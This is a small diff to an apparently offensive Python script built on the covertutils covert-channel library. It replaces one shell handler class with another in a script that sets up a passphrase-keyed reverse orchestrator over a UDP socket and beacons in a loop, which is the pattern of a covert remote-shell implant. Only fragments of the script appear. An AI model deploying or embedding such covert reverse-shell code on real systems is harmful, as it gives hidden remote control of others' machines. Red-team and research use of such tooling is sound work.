@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-from covertutils.handlers.impl import SimpleShellHandler
+from covertutils.handlers.impl import StandardShellHandler
 from covertutils.orchestration import SimpleOrchestrator
 
 import sys
@@ -21,7 +21,7 @@ def send( raw ) :		# Create wrappers for networking
 	return s.sendto( raw, addr )
 
 orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
-handler = SimpleShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
+handler = StandardShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
 
 while True :
     send( 'X' )
